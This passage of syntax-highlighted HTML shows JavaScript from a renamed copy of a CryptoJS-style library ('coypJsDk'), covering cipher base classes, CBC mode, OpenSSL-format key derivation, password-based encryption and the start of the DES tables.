<span class="number">1</span>; r &gt; l; l++)</span><br><span class="line">                    c = i.<span class="title function_">finalize</span>(c),</span><br><span class="line">                    i.<span class="title function_">reset</span>();</span><br><span class="line">                o.<span class="title function_">concat</span>(c)</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> o.<span class="property">sigBytes</span> = <span class="number">4</span> * s,</span><br><span class="line">            o</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    e.<span class="property">EvpKDF</span> = <span class="keyword">function</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> i.<span class="title function_">create</span>(r).<span class="title function_">compute</span>(e, t)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">nvl_</span> = <span class="string">&quot;al&quot;</span>,</span><br><span class="line">coypJsDk.<span class="property">lib</span>.<span class="property">Cipher</span> || <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = coypJsDk</span><br><span class="line">      , r = t.<span class="property">lib</span></span><br><span class="line">      , n = r.<span class="property">Base</span></span><br><span class="line">      , i = r.<span class="property">WordArray</span></span><br><span class="line">      , o = r.<span class="property">BufferedBlockAlgorithm</span></span><br><span class="line">      , a = t.<span class="property">enc</span>.<span class="property">Base64</span></span><br><span class="line">      , s = t.<span class="property">algo</span>.<span class="property">EvpKDF</span></span><br><span class="line">      , c = r.<span class="property">Cipher</span> = o.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: n.<span class="title function_">extend</span>(),</span><br><span class="line">        <span class="attr">createEncryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">create</span>(<span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>, e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">createDecryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">create</span>(<span class="variable language_">this</span>.<span class="property">_DEC_XFORM_MODE</span>, e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">cfg</span> = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(r),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_xformMode</span> = e,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_key</span> = t,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">reset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            o.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doReset</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">process</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_process</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">finalize</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> e &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">_append</span>(e),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">_doFinalize</span>()</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">keySize</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">ivSize</span>: <span class="number">4</span>,</span><br><span class="line">        <span class="attr">_ENC_XFORM_MODE</span>: <span class="number">1</span>,</span><br><span class="line">        <span class="attr">_DEC_XFORM_MODE</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="attr">_createHelper</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r ? d : f).<span class="title function_">encrypt</span>(e, t, r, n)</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> r ? d : f).<span class="title function_">decrypt</span>(e, t, r, n)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    r.<span class="property">StreamCipher</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">1</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> l = t.<span class="property">mode</span> = &#123;&#125;</span><br><span class="line">      , h = <span class="keyword">function</span>(<span class="params">t, r, n</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> i = <span class="variable language_">this</span>.<span class="property">_iv</span>;</span><br><span class="line">        i ? <span class="variable language_">this</span>.<span class="property">_iv</span> = e : i = <span class="variable language_">this</span>.<span class="property">_prevBlock</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; n &gt; o; o++)</span><br><span class="line">            t[r + o] ^= i[o]</span><br><span class="line">    &#125;</span><br><span class="line">      , u = (r.<span class="property">BlockCipherMode</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">createEncryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">Encryptor</span>.<span class="title function_">create</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">createDecryptor</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">Decryptor</span>.<span class="title function_">create</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_cipher</span> = e,</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_iv</span> = t</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)).<span class="title function_">extend</span>();</span><br><span class="line">    u.<span class="property">Encryptor</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_cipher</span></span><br><span class="line">              , n = r.<span class="property">blockSize</span>;</span><br><span class="line">            h.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, n),</span><br><span class="line">            r.<span class="title function_">encryptBlock</span>(e, t),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_prevBlock</span> = e.<span class="title function_">slice</span>(t, t + n)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    u.<span class="property">Decryptor</span> = u.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">processBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> r = <span class="variable language_">this</span>.<span class="property">_cipher</span></span><br><span class="line">              , n = r.<span class="property">blockSize</span></span><br><span class="line">              , i = e.<span class="title function_">slice</span>(t, t + n);</span><br><span class="line">            r.<span class="title function_">decryptBlock</span>(e, t),</span><br><span class="line">            h.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, n),</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_prevBlock</span> = i</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;),</span><br><span class="line">    l = l.<span class="property">CBC</span> = u,</span><br><span class="line">    u = (t.<span class="property">pad</span> = &#123;&#125;).<span class="property">Nopk</span> = &#123;</span><br><span class="line">        <span class="attr">pad</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="number">4</span> * t, r = r - e.<span class="property">sigBytes</span> % r, n = r &lt;&lt; <span class="number">24</span> | r &lt;&lt; <span class="number">16</span> | r &lt;&lt; <span class="number">8</span> | r, o = [], a = <span class="number">0</span>; r &gt; a; a += <span class="number">4</span>)</span><br><span class="line">                o.<span class="title function_">push</span>(n);</span><br><span class="line">            r = i.<span class="title function_">create</span>(o, r),</span><br><span class="line">            e.<span class="title function_">concat</span>(r)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">unpad</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            e.<span class="property">sigBytes</span> -= <span class="number">255</span> &amp; e.<span class="property">words</span>[e.<span class="property">sigBytes</span> - <span class="number">1</span> &gt;&gt;&gt; <span class="number">2</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    r.<span class="property">BlockCipher</span> = c.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: c.<span class="property">cfg</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">mode</span>: l,</span><br><span class="line">            <span class="attr">padding</span>: u</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">reset</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            c.<span class="property">reset</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>);</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">cfg</span></span><br><span class="line">              , t = e.<span class="property">iv</span></span><br><span class="line">              , e = e.<span class="property">mode</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_xformMode</span> == <span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>)</span><br><span class="line">                <span class="keyword">var</span> r = e.<span class="property">createEncryptor</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                r = e.<span class="property">createDecryptor</span>,</span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">_minBufferSize</span> = <span class="number">1</span>;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_mode</span> = r.<span class="title function_">call</span>(e, <span class="variable language_">this</span>, t &amp;&amp; t.<span class="property">words</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doProcessBlock</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">_mode</span>.<span class="title function_">processBlock</span>(e, t)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_doFinalize</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="property">padding</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">_xformMode</span> == <span class="variable language_">this</span>.<span class="property">_ENC_XFORM_MODE</span>) &#123;</span><br><span class="line">                e.<span class="title function_">pad</span>(<span class="variable language_">this</span>.<span class="property">_data</span>, <span class="variable language_">this</span>.<span class="property">blockSize</span>);</span><br><span class="line">                <span class="keyword">var</span> t = <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>)</span><br><span class="line">            &#125; <span class="keyword">else</span></span><br><span class="line">                t = <span class="variable language_">this</span>.<span class="title function_">_process</span>(!<span class="number">0</span>),</span><br><span class="line">                e.<span class="title function_">unpad</span>(t);</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">blockSize</span>: <span class="number">4</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">var</span> p = r.<span class="property">CipherParams</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">init</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">mixIn</span>(e)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">toString</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (e || <span class="variable language_">this</span>.<span class="property">formatter</span>).<span class="title function_">stringify</span>(<span class="variable language_">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , l = (t.<span class="property">format</span> = &#123;&#125;).<span class="property">OpenSSL</span> = &#123;</span><br><span class="line">        <span class="attr">stringify</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">ciphertext</span>;</span><br><span class="line">            <span class="keyword">return</span> e = e.<span class="property">salt</span>,</span><br><span class="line">            (e ? i.<span class="title function_">create</span>([<span class="number">1398893684</span>, <span class="number">1701076831</span>]).<span class="title function_">concat</span>(e).<span class="title function_">concat</span>(t) : t).<span class="title function_">toString</span>(a)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">parse</span>: <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">            e = a.<span class="title function_">parse</span>(e);</span><br><span class="line">            <span class="keyword">var</span> t = e.<span class="property">words</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1398893684</span> == t[<span class="number">0</span>] &amp;&amp; <span class="number">1701076831</span> == t[<span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">var</span> r = i.<span class="title function_">create</span>(t.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">                t.<span class="title function_">splice</span>(<span class="number">0</span>, <span class="number">4</span>),</span><br><span class="line">                e.<span class="property">sigBytes</span> -= <span class="number">16</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">ciphertext</span>: e,</span><br><span class="line">                <span class="attr">salt</span>: r</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , f = r.<span class="property">SerializableCipher</span> = n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: n.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">format</span>: l</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n);</span><br><span class="line">            <span class="keyword">var</span> i = e.<span class="title function_">createEncryptor</span>(r, n);</span><br><span class="line">            <span class="keyword">return</span> t = i.<span class="title function_">finalize</span>(t),</span><br><span class="line">            i = i.<span class="property">cfg</span>,</span><br><span class="line">            p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">ciphertext</span>: t,</span><br><span class="line">                <span class="attr">key</span>: r,</span><br><span class="line">                <span class="attr">iv</span>: i.<span class="property">iv</span>,</span><br><span class="line">                <span class="attr">algorithm</span>: e,</span><br><span class="line">                <span class="attr">mode</span>: i.<span class="property">mode</span>,</span><br><span class="line">                <span class="attr">padding</span>: i.<span class="property">padding</span>,</span><br><span class="line">                <span class="attr">blockSize</span>: e.<span class="property">blockSize</span>,</span><br><span class="line">                <span class="attr">formatter</span>: n.<span class="property">format</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="title function_">_parse</span>(t, n.<span class="property">format</span>),</span><br><span class="line">            e.<span class="title function_">createDecryptor</span>(r, n).<span class="title function_">finalize</span>(t.<span class="property">ciphertext</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">_parse</span>: <span class="keyword">function</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;string&quot;</span> == <span class="keyword">typeof</span> e ? t.<span class="title function_">parse</span>(e, <span class="variable language_">this</span>) : e</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">      , t = (t.<span class="property">kdf</span> = &#123;&#125;).<span class="property">OpenSSL</span> = &#123;</span><br><span class="line">        <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n || (n = i.<span class="title function_">random</span>(<span class="number">8</span>)),</span><br><span class="line">            e = s.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">keySize</span>: t + r</span><br><span class="line">            &#125;).<span class="title function_">compute</span>(e, n),</span><br><span class="line">            r = i.<span class="title function_">create</span>(e.<span class="property">words</span>.<span class="title function_">slice</span>(t), <span class="number">4</span> * r),</span><br><span class="line">            e.<span class="property">sigBytes</span> = <span class="number">4</span> * t,</span><br><span class="line">            p.<span class="title function_">create</span>(&#123;</span><br><span class="line">                <span class="attr">key</span>: e,</span><br><span class="line">                <span class="attr">iv</span>: r,</span><br><span class="line">                <span class="attr">salt</span>: n</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      , d = r.<span class="property">PasswordBasedCipher</span> = f.<span class="title function_">extend</span>(&#123;</span><br><span class="line">        <span class="attr">cfg</span>: f.<span class="property">cfg</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">            <span class="attr">kdf</span>: t</span><br><span class="line">        &#125;),</span><br><span class="line">        <span class="attr">encrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            r = n.<span class="property">kdf</span>.<span class="title function_">execute</span>(r, e.<span class="property">keySize</span>, e.<span class="property">ivSize</span>),</span><br><span class="line">            n.<span class="property">iv</span> = r.<span class="property">iv</span>,</span><br><span class="line">            e = f.<span class="property">encrypt</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, r.<span class="property">key</span>, n),</span><br><span class="line">            e.<span class="title function_">mixIn</span>(r),</span><br><span class="line">            e</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">decrypt</span>: <span class="keyword">function</span>(<span class="params">e, t, r, n</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n = <span class="variable language_">this</span>.<span class="property">cfg</span>.<span class="title function_">extend</span>(n),</span><br><span class="line">            t = <span class="variable language_">this</span>.<span class="title function_">_parse</span>(t, n.<span class="property">format</span>),</span><br><span class="line">            r = n.<span class="property">kdf</span>.<span class="title function_">execute</span>(r, e.<span class="property">keySize</span>, e.<span class="property">ivSize</span>, t.<span class="property">salt</span>),</span><br><span class="line">            n.<span class="property">iv</span> = r.<span class="property">iv</span>,</span><br><span class="line">            f.<span class="property">decrypt</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>, e, t, r.<span class="property">key</span>, n)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = (<span class="variable language_">this</span>.<span class="property">_lBlock</span> &gt;&gt;&gt; e ^ <span class="variable language_">this</span>.<span class="property">_rBlock</span>) &amp; t;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_rBlock</span> ^= r,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_lBlock</span> ^= r &lt;&lt; e</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = (<span class="variable language_">this</span>.<span class="property">_rBlock</span> &gt;&gt;&gt; e ^ <span class="variable language_">this</span>.<span class="property">_lBlock</span>) &amp; t;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_lBlock</span> ^= r,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_rBlock</span> ^= r &lt;&lt; e</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> r = coypJsDk</span><br><span class="line">      , n = r.<span class="property">lib</span></span><br><span class="line">      , i = n.<span class="property">WordArray</span></span><br><span class="line">      , n = n.<span class="property">BlockCipher</span></span><br><span class="line">      , o = r.<span class="property">algo</span></span><br><span class="line">      , a = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">      , s = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">      , c = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>]</span><br><span class="line">      , l = [&#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">268435456</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">536870912</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">805306368</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">1073741824</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1342177280</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">1610612736</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">1879048192</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">2147483648</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">2415919104</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">2684354560</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">2952790016</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">3221225472</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">3489660928</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">3758096384</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">4026531840</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">134217728</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">402653184</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">671088640</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">939524096</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">1207959552</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">1476395008</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1744830464</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">2013265920</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">2281701376</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">2550136832</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">2818572288</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">3087007744</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">3355443200</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">3623878656</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">3892314112</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">4160749568</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">1</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">268435457</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">536870913</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">805306369</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">1073741825</span>: <span class="number">8421378</span>,</span><br><span class="line">        <span class="number">1342177281</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">1610612737</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1879048193</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">2147483649</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">2415919105</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">2684354561</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">2952790017</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">3221225473</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">3489660929</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">3758096385</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">4026531841</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">134217729</span>: <span class="number">8421890</span>,</span><br><span class="line">        <span class="number">402653185</span>: <span class="number">8421376</span>,</span><br><span class="line">        <span class="number">671088641</span>: <span class="number">8388608</span>,</span><br><span class="line">        <span class="number">939524097</span>: <span class="number">512</span>,</span><br><span class="line">        <span class="number">1207959553</span>: <span class="number">32768</span>,</span><br><span class="line">        <span class="number">1476395009</span>: <span class="number">8388610</span>,</span><br><span class="line">        <span class="number">1744830465</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="number">2013265921</span>: <span class="number">33282</span>,</span><br><span class="line">        <span class="number">2281701377</span>: <span class="number">32770</span>,</span><br><span class="line">        <span class="number">2550136833</span>: <span class="number">8389122</span>,</span><br><span class="line">        <span class="number">2818572289</span>: <span class="number">514</span>,</span><br><span class="line">        <span class="number">3087007745</span>: <span class="number">8421888</span>,</span><br><span class="line">        <span class="number">3355443201</span>: <span class="number">8389120</span>,</span><br><span class="line">        <span class="number">3623878657</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="number">3892314113</span>: <span class="number">33280</span>,</span><br><span class="line">        <span class="number">4160749569</span>: <span class="number">8421378</span></span><br><span class="line">    &#125;, &#123;</span><br><span class="line">        <span class="number">0</span>: <span class="number">1074282512</span>,</span><br><span class="line">        <span class="number">16777216</span>: <span class="number">16384</span>,</span><br><span class="line">        <span class="number">33554432</span>: <span class="number">524288</span>,</span><br><span class="line">        <span class="number">50331648</span>: <span class="number">1074266128</span>,</span><br><span class="line">        <span class="number">67108864</span>: <span class="number">1073741840</span>,</span><br><span class="line">        <span class="number">83886080</span>: <span class="number">1074282496</span>,</span><br><span class="line">        <span class="number">100663296</span>: <span class="number">1073758208</span>,</span><br><span class="line">        <span class="number">117440512</span>: <span class="number">16</span>,</span><br><span class="line">        <span 